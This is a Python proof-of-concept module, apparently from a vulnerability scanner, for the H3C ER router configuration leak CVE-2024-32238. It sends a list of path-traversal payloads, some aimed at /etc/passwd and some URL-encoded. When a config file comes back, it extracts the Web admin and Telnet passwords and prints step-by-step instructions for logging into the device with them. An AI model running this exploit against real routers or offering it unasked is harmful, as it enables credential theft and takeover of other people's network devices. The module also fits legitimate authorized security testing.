"""
H3C 路由器配置泄露漏洞检测 PoC

漏洞原理：
利用路径穿越漏洞访问：
    /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
获取路由器配置文件，其中包含 Telnet 密码、Web 管理密码等敏感信息。
"""
import re
import socket
from typing import Dict, Any, Optional, List
from pocs.base import PoCBase
from utils.common import extract_sensitive_info


class H3CConfigLeak(PoCBase):
    """H3C 配置泄露漏洞检测"""

    NAME = "H3C 路由器配置泄露检测 (CVE-2024-32238)"
    TYPE = "配置泄露"
    SEVERITY = "critical"
    CVE = "CVE-2024-32238"
    DESCRIPTION = (
        "H3C ER G2系列企业路由器存在不正确访问控制漏洞(CVE-2024-32238)。"
        "攻击者通过路径穿越访问 /userLogin.asp/../actionpolicy_status/../设备型号.cfg "
        "可获取完整配置文件，泄露Telnet密码(vtypasswd)、Web管理密码(admpwd)、"
        "密码找回提示(admpwdpromt)等敏感信息。"
    )

    # 路径穿越 payload 列表 - 更全面的覆盖
    PAYLOADS = [
        # ===== H3C ER 系列 主漏洞 =====
        "/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg",
        "/userLogin.asp/../actionpolicy_status/../ER8300G2.cfg",
        "/userLogin.asp/../actionpolicy_status/../ER5200G2.cfg",
        "/userLogin.asp/../actionpolicy_status/../ER3200G2.cfg",
        "/userLogin.asp/../actionpolicy_status/../ER3100G2.cfg",
        "/userLogin.asp/../actionpolicy_status/../ER6300G2.cfg",
        "/userLogin.asp/../actionpolicy_status/../ER5200G3.cfg",
        "/userLogin.asp/../actionpolicy_status/../ER3200G3.cfg",
        "/userLogin.asp/../actionpolicy_status/../ER3108GW.cfg",
        # ===== 通用路径穿越 =====
        "/userLogin.asp/../backup/startup.cfg",
        "/userLogin.asp/../backup/config.cfg",
        "/userLogin.asp/../conf/config.cfg",
        "/userLogin.asp/../config.cfg",
        "/userLogin.asp/../startup.cfg",
        "/userLogin.asp/../backup.cfg",
        "/actionpolicy_status/../backup/startup.cfg",
        "/actionpolicy_status/../config.cfg",
        # ===== 直接访问配置文件 =====
        "/ER8300G2-X.cfg",
        "/ER8300G2.cfg",
        "/ER5200G2.cfg",
        "/ER3200G2.cfg",
        "/ER3100G2.cfg",
        "/conf/ER8300G2-X.cfg",
        "/conf/ER8300G2.cfg",
        "/backup/ER8300G2-X.cfg",
        # ===== Comware 设备 =====
        "/userLogin.asp/../../../../etc/passwd",
        "/userLogin.asp/../../../../flash/cfg/startup.cfg",
        "/userLogin.asp/../../../../flash/startup.cfg",
        # ===== 其他常见路径穿越 =====
        "/..%252f..%252f..%252f..%252fetc/passwd",
        "/..%2f..%2f..%2f..%2fetc/passwd",
        "/static/../../..%2f..%2f..%2f..%2fetc/passwd",
        # ===== 备份文件 =====
        "/backup/config.dat",
        "/backup/config.bak",
        "/backup/config.zip",
        "/conf/config.dat",
        "/conf/config.bak",
        # ===== 通用路由器配置泄露 =====
        "/cfg/config.cfg",
        "/cfg/startup.cfg",
        "/cfg/backup.cfg",
        "/config/get_config",
        "/config/getconfig",
        "/cgi-bin/getconfig",
        "/cgi-bin/backup.cgi",
        "/cgi-bin/config.cgi",
        "/cgi-bin/download.cgi",
        "/cgi-bin/export.cgi",
        # ===== 空路径 =====
        "/",
    ]

    # 配置文件中的敏感字段
    SENSITIVE_PATTERNS = [
        r'admpwd\s*=\s*"?([^"\s]+)',
        r'vtypasswd\s*=\s*"?([^"\s]+)',
        r'userpass\s*=\s*"?([^"\s]+)',
        r'model\s*=\s*"?([^"\s]+)',
        r'serial\s*=\s*"?([^"\s]+)',
        r'version\s*=\s*"?([^"\s]+)',
        r'dhcp_server\s*=\s*"?([^"\s]+)',
        r'dhcpserver\s*=\s*"?([^"\s]+)',
        r'ntp_server\s*=\s*"?([^"\s]+)',
        r'ntpserver\s*=\s*"?([^"\s]+)',
    ]

    # H3C 设备指纹识别特征
    FINGERPRINT_CHECKS = [
        # URL 路径特征
        {"type": "path", "value": "/userLogin.asp"},
        {"type": "path", "value": "/actionpolicy_status"},
        # HTML 页面特征
        {"type": "body_keyword", "value": "H3C"},
        {"type": "body_keyword", "value": "ER8300"},
        {"type": "body_keyword", "value": "ER5200"},
        {"type": "body_keyword", "value": "ER3200"},
        {"type": "body_keyword", "value": "ER3100"},
        {"type": "body_keyword", "value": "Comware"},
        # Header 特征
        {"type": "header", "value": "H3C"},
        {"type": "header", "value": "Comware"},
    ]

    def check(self) -> Dict[str, Any]:
        """执行漏洞检测"""
        # 快速端口预检：端口未开放时直接跳过，避免超时等待
        if not self._is_port_open():
            return self._build_result(
                vulnerable=False,
                type_=self.TYPE,
                detail="端口未开放，跳过检测",
                fingerprint="",
            )

        # 先检测是否为 H3C 设备
        fingerprint = self._detect_fingerprint()

        # 执行路径穿越检测
        for payload in self.PAYLOADS:
            result = self._try_payload(payload, fingerprint)
            if result["vulnerable"]:
                return result

        # 未发现漏洞
        return self._build_result(
            vulnerable=False,
            type_=self.TYPE,
            detail="未检测到配置泄露漏洞",
            fingerprint=fingerprint,
        )

    def _is_port_open(self) -> bool:
        """快速检测端口是否开放（2秒超时）"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def _detect_fingerprint(self) -> str:
        """检测 H3C 设备指纹"""
        # 先检测根路径
        resp = self.get("/")
        if resp:
            server = resp.headers.get("Server", "").lower()
            if "h3c-miniware" in server:
                return "H3C-Miniware"
            if "h3c" in server:
                return "H3C"
            if "comware" in server:
                return "H3C-Comware"

            # 检查响应体
            body = resp.text.lower()
            if "h3c" in body or "er8300" in body:
                return "H3C"
            if "comware" in body:
                return "H3C-Comware"

        # 尝试访问 userLogin.asp
        resp = self.get("/userLogin.asp")
        if resp and resp.status_code == 200:
            body = resp.text.lower()
            if "h3c" in body:
                return "H3C"
            if "comware" in body:
                return "H3C-Comware"

        return ""

    def _try_payload(self, payload: str, fingerprint: str = "") -> Dict[str, Any]:
        """尝试单个 payload"""
        resp = self.get(payload)

        if resp is None:
            return self._build_result(
                vulnerable=False,
                type_=self.TYPE,
                detail=f"请求失败: {payload}",
                fingerprint=fingerprint,
            )

        status = resp.status_code
        text = resp.text
        content_type = resp.headers.get("Content-Type", "").lower()

        # ===== 严格的配置文件验证 =====
        # 1. 状态码必须为 200
        # 2. Content-Type 不能是 text/html（排除HTML登录页面误报）
        # 3. 内容必须 >= 1000 bytes（配置文件远大于此）
        # 4. 内容必须匹配 Miniware 配置文件格式
        if (status == 200
                and "text/html" not in content_type
                and len(text) >= 1000
                and self._is_config_file(text)):
            # 提取敏感信息
            sensitive_info = extract_sensitive_info(text)

            # 构建利用链详情
            model = sensitive_info.get("model", "未知型号")
            version = sensitive_info.get("version", "未知版本")
            detail_lines = [
                f"▶ 漏洞利用成功！",
                f"  利用路径: GET {payload}",
                f"  完整URL: {self.base_url}{payload}",
                f"  返回状态: HTTP {status}",
                f"  配置文件大小: {len(text)} bytes",
            ]
            if model and model != "未知型号":
                detail_lines.append(f"  设备型号: {model} / {version}")

            # 敏感信息摘要
            if sensitive_info:
                detail_lines.append(f"  📋 提取的敏感信息:")
                if "admpwd" in sensitive_info:
                    detail_lines.append(
                        f"    🔑 Web管理密码: {sensitive_info['admpwd']}"
                        f" (admpwd=  @webadmin 段)"
                    )
                if "vtypasswd" in sensitive_info:
                    detail_lines.append(
                        f"    🔑 Telnet/VTY密码: {sensitive_info['vtypasswd']}"
                        f" (vtypasswd=  @base 段 #1/#2)"
                    )
                if "admpwdpromt" in sensitive_info:
                    detail_lines.append(
                        f"    💡 密码找回提示: {sensitive_info['admpwdpromt']}"
                        f" (admpwdpromt= 密码找回验证信息)"
                    )
                if "telnet_enable" in sensitive_info:
                    detail_lines.append(
                        f"    📡 Telnet服务: {sensitive_info['telnet_enable']}"
                    )
                if "dns_master" in sensitive_info:
                    detail_lines.append(
                        f"    🌐 DNS主服务器: {sensitive_info['dns_master']}"
                    )
                if "dhcp_server" in sensitive_info:
                    detail_lines.append(
                        f"    📡 DHCP服务器: {sensitive_info['dhcp_server']}"
                    )

            # 漏洞利用建议
            detail_lines.append(f"  ⚡ 漏洞利用:")
            detail_lines.append(f"    1. Telnet登录: telnet {self.target} {self.port}")
            detail_lines.append(
                f"       密码: {sensitive_info.get('vtypasswd', 'N/A')}"
            )
            detail_lines.append(
                f"    2. Web登录: http://{self.target}:{self.port}/userLogin.asp"
            )
            detail_lines.append(
                f"       密码: {sensitive_info.get('admpwd', 'N/A')}"
            )
            detail_lines.append(
                f"    3. 弱口令检测: {self._weak_password_check(sensitive_info)}"
            )

            return self._build_result(
                vulnerable=True,
                type_=self.TYPE,
                detail="\n".join(detail_lines),
                sensitive_info=sensitive_info,
                fingerprint=fingerprint or "H3C",
            )

        return self._build_result(
            vulnerable=False,
            type_=self.TYPE,
            detail=f"未发现泄露: {payload} (HTTP {status})",
            fingerprint=fingerprint,
        )

    def _weak_password_check(self, sensitive_info: dict) -> str:
        """检测提取的密码是否为弱口令"""
        weak = []
        for field, label in [("admpwd", "Web密码"), ("vtypasswd", "Telnet密码")]:
            pwd = sensitive_info.get(field, "")
            if pwd and pwd.lower() in ["admin", "admin123", "password", "123456",
                                         "root", "test", "h3c", "admin123!"]:
                weak.append(f"{label}是弱口令!")
        if weak:
            return "⚠️ " + "; ".join(weak)
        return "✓ 密码强度较高，未命中已知弱口令库"

    def _is_config_file(self, text: str) -> bool:
        """
        判断响应内容是否为路由器配置文件

        支持格式：
        - H3C Miniware (ER系列): @section 分段 + key=value
        - H3C Comware: 标准配置文件格式
        - 通用: 包含敏感字段 admpwd/vtypasswd
        """
        if not text or len(text) < 50:
            return False

        # === 一级检测：直接命中敏感字段 ===
        if re.search(r'admpwd\s*=', text, re.IGNORECASE):
            return True
        if re.search(r'vtypasswd\s*=', text, re.IGNORECASE):
            return True
        if re.search(r'userpass\s*=', text, re.IGNORECASE):
            return True

        # === 二级检测：Miniware 格式识别 ===
        # Miniware 特征：@section_name 分段 + key=value 配置 + hash token行
        minware_score = 0
        # @开头的section
        if re.search(r'^@\w+', text, re.MULTILINE):
            minware_score += 2
        # # 分隔符 (Miniware的块分隔)
        if re.search(r'^#$', text, re.MULTILINE):
            minware_score += 1
        # passwd= 空密码字段
        if re.search(r'^passwd=$', text, re.MULTILINE):
            minware_score += 1
        # 设备型号行 (如 ER8300G2-X/ERHMG2V100D026)
        if re.search(r'^ER\d+\w*/', text, re.MULTILINE):
            minware_score += 2
        # hash token (32位十六进制)
        if re.search(r'^[0-9a-f]{32}\s*$', text, re.MULTILINE | re.IGNORECASE):
            minware_score += 1
        # vtyname/telnetenable 等 Miniware 特有字段
        if re.search(r'vtyname=', text, re.IGNORECASE):
            minware_score += 1
        if re.search(r'telnetenable=', text, re.IGNORECASE):
            minware_score += 1
        if re.search(r'dhcpdippool', text, re.IGNORECASE):
            minware_score += 1
        if minware_score >= 3:
            return True

        # === 三级检测：多特征匹配 ===
        config_indicators = [
            r'^\s*[#!]',
            r'^interface\s+\w+',
            r'ip\s+address',
            r'dhcp\s+server',
            r'ntp\s+server',
            r'^hostname\s+\w+',
            r'^enable\s+password',
            r'vlan\s+\d+',
            r'configuration\s*version',
            r'model\s*=',
            r'serial\s*=',
        ]
        matched_count = 0
        for pattern in config_indicators:
            if re.search(pattern, text, re.IGNORECASE | re.MULTILINE):
                matched_count += 1
                if matched_count >= 2:
                    return True

        # === 四级检测：大内容+H3C关键字 ===
        if len(text) > 200:
            keywords = ['h3c', 'comware', 'er8300', 'er5200',
                        'er3200', 'er3100', 'msr', 'admpwd',
                        'vtypasswd', 'miniware']
            if any(kw in text.lower() for kw in keywords):
                return True

        return False

    def check_weak_password(self, username: str, password: str) -> bool:
        """
        简单弱口令验证（模拟）
        实际项目中可以对 admpwd/vtypasswd 字段进行弱口令检测
        """
        weak_passwords = [
            "admin", "admin123", "admin123!",
            "password", "123456", "root",
            "H3C", "h3c", "test",
        ]
        for weak_pwd in weak_passwords:
            if password.lower() == weak_pwd.lower():
                return True
        return False
